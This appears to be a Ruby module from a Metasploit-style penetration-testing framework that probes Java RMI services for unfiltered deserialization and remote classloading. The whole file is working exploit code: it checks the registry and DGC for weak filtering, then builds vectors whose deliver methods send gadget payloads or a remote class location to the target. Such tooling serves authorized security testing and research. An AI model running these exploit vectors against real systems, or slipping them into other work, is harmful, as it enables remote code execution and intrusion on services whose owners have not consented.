# -*- coding: binary -*-

require 'rex/ui/text/output/stdio'

module Msf
  module Exploit::Java::Serialized::RMI




    class Util
      @@out = Rex::Ui::Text::Output::Stdio.new

      def self.test_remoteclassloading(host, port, reg, objid, uid, methodid, methodhash, ssl: false)
        args = [Rex::Java::Serialization::Metamodel::JavaCustomObject.new(
          'Ldoesnotexist;', 
          {}, 
          'typeString' => 'Ldoesnotexist;')]

        client = Rex::Java::JRMP::JRMPClient.new(host, port, reg, location: 'invalid', ssl: ssl)
        client.call(objid, 
                    methodid, 
                    methodhash, 
                    args, 
                    uid: uid)
        raise 'Should not succeed'
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        type = root[0][0]

        if type == 'java.net.MalformedURLException'
          Util.vuln 'Endpoint appears to allow remote classloading'
          return true
        elsif type == 'java.lang.ClassNotFoundException'
          return false
        else
          raise
        end
      end

      # TODO: is this an accepted way to produce output?
      # otherwise, how to get the module instance?
      def self.info(s)
        @@out.print_status(s)
      end

      def self.error(s)
        @@out.print_error(s)
      end

      def self.okay(s)
        @@out.print_good(s)
      end
      
      def self.vuln(s)
        @@out.print_warning(s)
      end
    end

    class RMICallArgumentVector < AttackVector
      def initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0)
        @host = host
        @port = port
        @ssl = ssl
        @objId = objId
        @uid = uid
        @methodId = methodId
        @methodHash = methodHash
        @baseargs = baseargs
        @argidx = argidx
        @location = nil
      end

      def inspect
        format('RMI call %s:%d objID %d mId %d mHash %d', @host, @port, @objId, @methodId, @methodHash)
      end
    end

    class RMICallDeserVector < RMICallArgumentVector
      def	initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0, ctx: nil)
        super(host, port, objId, uid: uid, methodId: methodId, methodHash: methodHash, ssl: ssl, baseargs: baseargs, argidx: argidx)
        @ctx = ctx
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        10
      end

      def payload
        nil
      end

      def context
        @ctx
      end

      def deliver(payl)
        args = @baseargs.dup
        args[@argidx] = payl
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        client.call(@objId, @methodId, @methodHash, args, uid: @uid)
      end

      def inspect
        super + ': Deserialization ' + @ctx.gadgets.to_a.to_s
      end
    end

    class RMIClassLoadingVector < RMICallArgumentVector
      def inspect
        super + ': Remote Classloading'
      end

      def id
        ['classload', @host, @port]
      end

      def prio
        -10
      end

      def deliver(payl)
        reg = Rex::Java::Serialization::Metamodel::Registry.new(base: File.dirname(__FILE__) + '/')
        reg.load('model/base-java9.json')
        reg.load('model/rmi.json')
        args = @baseargs.dup
        ts = 'L' + payl[1].tr('.', '/') + ';'
        args[@argidx] = Rex::Java::Serialization::Metamodel::JavaCustomObject.new(payl[1], {}, 'typeString' => ts)
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, reg, ssl: @ssl, location: payl[0])
        client.call(@objId, @methodId, @methodHash, args, uid: @uid)
      end
    end

    class RMIProber
      def initialize(host, port, reg, ssl: false, rc: RunConfig.new)
        @host = host
        @port = port
        @reg = reg
        @ssl = ssl
        @foundobjects = {}
        @rc = rc
      end

      def check_object_exists(objId, uid: nil)
        begin
          client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.call(objId, 0, 0, [], uid: uid)
          Util.error 'Should not succeed'
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.server.SkeletonMismatchException'
            return true
          elsif type == 'java.rmi.NoSuchObjectException'
          else
              if !root[1]['detailMessage'].nil?
                Util.error type + ':' + root[1]['detailMessage']
              else
                Util.error type
              end
          end
        end
        false
      end
      
      def test_call(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        send(params['objid'], params['methodid'], params['methodhash'], args, customreg: reg)
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def send(objId, opNum, hash, args, uid: nil, location: nil, customreg: nil)
        reg = @reg
        unless customreg.nil?
          customreg.load('model/rmi.json')
          reg = customreg
        end
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.call(objId, opNum, hash, args, uid: uid)
      end

      def objects
        @foundobjects
      end

      def run
        begin
          check_object_exists(2)
        rescue Rex::Java::JRMP::InvalidResponseError => e
          begin
            @ssl = true
            check_object_exists(2)
            Util.info 'Endpoint appears to use SSL'
          rescue
            raise e
          end
        end

        vectors = []
        vectors += run_registry if check_object_exists(0)

        Util.info 'Found Activator, no checks implemented yet' if check_object_exists(1)

        if check_object_exists(2)
          vectors += run_dgc
        else
          Util.error 'No DGC Found'
        end

        if check_object_exists(4)
          Util.info 'Found ActivationSystem, no checks implemented yet'
        end

        vectors
      end
      
      def run_registry
        vectors = []
        regobjects = send(0, 1, 4905912898345647071, [])
        if regobjects.empty?
          Util.info 'Found RMI Registry with no objects registered'
        else
          Util.info 'Found RMI Registry with ' + regobjects.length.to_s + ' registered objects'
        end

        if regobjects.include?('jmxrmi')
          Util.info 'Found JMX server, perform further checks later'
        end

        begin
          send(0, 2, 4905912898345647071, ['doesnotexist'])
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.NotBoundException'
          else
            Util.error 'Regular lookup failed: ', type, root[1]['detailMessage']
          end
        end

        begin
          url = Rex::Java::Serialization::Metamodel::JavaObject.new('Ljava/net/URL;', 
                                                                    'protocol' => 'http',
                                                                    'host' => 'test.invalid',
                                                                    'hashCode' => -1)
          send(0, 2, 4905912898345647071, [url])
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            Util.okay 'Registry lookup() name argument is filtered'
          elsif type == 'java.lang.ClassCastException'
            Util.vuln 'Registry lookup() unfiltered'

            if @rc.tryDeser?
              ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, 
                                                                                       params: {
                'objid' => 0,
                'methodid' => 2,
                'methodhash' => 4905912898345647071,
                'args' => [nil],
                'argidx' => 0
              })
              strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:test_call))
              strategy.init(ctx)

              if ctx.run(strategy)
                vectors.push(RMICallDeserVector.new(@host, 
                                                    @port, 
                                                    0,
                                                    methodId: 2, 
                                                    methodHash: 4905912898345647071, 
                                                    ssl: @ssl,
                                                    argidx: 0, 
                                                    ctx: ctx))
              end
            end
          else
            Util.error 'Registry lookup() failed: ' + type
          end
        end

        bound = false
        begin
          send(0, 3, 4905912898345647071, ['bindtest', nil])
          bound = true
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.NullPointerException'
          elsif type == 'java.rmi.AccessException' || type == 'java.rmi.AlreadyBoundException'
          else
            Util.error 'Registry rebind() failed: ' + type
          end
        end

        filtered = false
        noaccess = false
        begin
          url = Rex::Java::Serialization::Metamodel::JavaObject.new('Ljava/net/URL;', 
                                                                    'protocol' => 'http',
                                                                    'host' => 'test.invalid',
                                                                    'hashCode' => -1)
          send(0, 3, 4905912898345647071, ['bindtest', url])
          bound = true
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            Util.okay 'Registry rebind() is filtered'
            filtered = true
          elsif type == 'java.rmi.AccessException'
            Util.info 'Bind access check before deserialization'
            noaccess = true
          elsif type == 'java.rmi.AlreadyBoundException' || type == 'java.lang.ClassCastException'
            Util.info 'Bind failed: ' + type
          else
            Util.error 'Registry rebind() failed: ' + type
          end
        rescue Exception => e
          Util.error 'Registry rebind() failed: ' + e.to_s
        end

        begin
          if !filtered && @rc.tryClassload? &&
                Util.test_remoteclassloading(@host, 
                                           @port, 
                                           @reg, 
                                           0, 
                                           0, 
                                           3, 
                                           4905912898345647071, 
                                           ssl: @ssl)
          vectors.push(RMIClassLoadingVector.new(@host, 
                                                 @port, 
                                                 0,
                                                 methodId: 3,
                                                 methodHash: 4905912898345647071,
                                                 ssl: @ssl))
          end
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
        end

        if @rc.tryDeser? && !noaccess && !filtered
          ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, 
                                                                                  params: {
            'objid' => 0,
            'methodid' => 3,
            'methodhash' => 4905912898345647071,
            'args' => ['bindtest', nil],
            'argidx' => 1
          })
          strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:test_call))
          strategy.init(ctx)

          if ctx.run(strategy)
            vectors.push(RMICallDeserVector.new(@host, 
                                                @port, 
                                                0,
                                                methodId: 3,
                                                methodHash: 4905912898345647071, 
                                                ssl: @ssl,
                                                baseargs: ['bindtest', nil], 
                                                argidx: 1, 
                                                ctx: ctx))
          end
        end

        begin
          send(0, 4, 4905912898345647071, ['bindtest']) if bound
        rescue => e
          Util.error 'Registry unbind() for cleanup failed: ' + e.to_s
        end

        regobjects.each do |name|
          begin
            ref = send(0, 2, 4905912898345647071, [name])
            ref = Rex::Java::JRMP::Util.unwrap_ref(ref)
            if ref.nil?
              Util.error 'Invalid reference ' + name
            else
              @foundobjects[name] = ref
            end
          rescue Rex::Java::JRMP::JRMPError => e
            root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
            Util.error 'Failed to lookup ' + name + ': ' + root.to_s
          end
        end

        vectors
      end

      def run_dgc
        vectors = []
        Util.info 'DGC found'
        # r = client.call(2,0,17777547820122932803,[]) #DGC.clean(ObjID[], long, VMID, boolean)
        # r = client.call(2,1,17777547820122932803,[]) #DGC.dirty(ObjID[], long, Lease)
        begin
          url = Rex::Java::Serialization::Metamodel::JavaObject.new('Ljava/net/URL;', 
                                                                    'protocol' => 'http',
                                                                    'host' => 'test.invalid',
                                                                    'hashCode' => -1)
          send(2, 1, 17777547820122932803, [
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/rmi/server/ObjID;', []), 
            Rex::Java::Serialization::Metamodel::JavaLong.new(0), 
            url])

        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            Util.okay 'DGC filters parameter types'
          elsif type == 'java.lang.ClassCastException'
            Util.vuln 'DGC does not filter parameters'
            vectors += run_dgc_deser if @rc.tryDeser?
          else
            Util.error 'DGC dirty failed: ' + type
          end
        end
        vectors
      end

      def run_dgc_deser
        vectors = []
        ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg, 
                                                                                params: {
          'objid' => 2,
          'methodid' => 1,
          'methodhash' => 17777547820122932803,
          'args' => [
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/rmi/server/ObjID;', []),
            Rex::Java::Serialization::Metamodel::JavaLong.new(0), nil],
          'argidx' => 2
        })

        strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:test_call))
        strategy.init(ctx)

        if ctx.run(strategy)
          args = [
            Rex::Java::Serialization::Metamodel::JavaArray.new('Ljava/rmi/server/ObjID;', []),
            Rex::Java::Serialization::Metamodel::JavaLong.new(0),
            nil
          ]
          vectors.push(RMICallDeserVector.new(@host, 
                                              @port, 
                                              2,
                                              methodId: 1, 
                                              methodHash: 17777547820122932803, 
                                              ssl: @ssl,
                                              baseargs: args,
                                              argidx: 2, 
                                              ctx: ctx))
        end
        vectors
      end
    end
  end
end
